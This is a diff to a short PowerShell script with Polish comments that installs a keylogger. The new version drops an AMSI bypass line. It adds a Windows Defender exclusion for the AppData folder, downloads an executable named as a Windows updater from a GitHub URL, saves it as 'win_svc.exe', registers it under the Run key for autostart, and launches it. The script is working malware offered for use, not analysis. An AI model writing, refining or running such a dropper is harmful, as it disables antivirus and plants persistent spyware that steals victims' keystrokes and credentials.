@@ -1,15 +1,14 @@
-# 1. Bypass AMSI (opcjonalnie, by ukryć działania)
-[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
-
-# 2. Wykluczenie folderu z Windows Defender
+# 1. Dodanie wykluczenia (wyłącza skanowanie folderu AppData)
 Add-MpPreference -ExclusionPath $env:appdata -ea 0
 
-# 3. Pobranie Twojego keyloggera (EXE)
+# 2. Ustawienie ścieżki docelowej dla Twojego pliku .exe
 $p = $env:appdata + '\win_svc.exe'
+
+# 3. Pobranie keyloggera z Twojego głównego linku
 iwr 'https://github.com/rexit8829-hub/assets/raw/refs/heads/main/WindowsUpdater.exe' -o $p
 
-# 4. Dodanie do autostartu (rejestr)
+# 4. Dodanie wpisu do autostartu, aby plik wracał po restarcie
 reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v WinUpdate /t REG_SZ /d $p /f
 
-# 5. Uruchomienie keyloggera
+# 5. Uruchomienie pliku natychmiast
 start-process $p
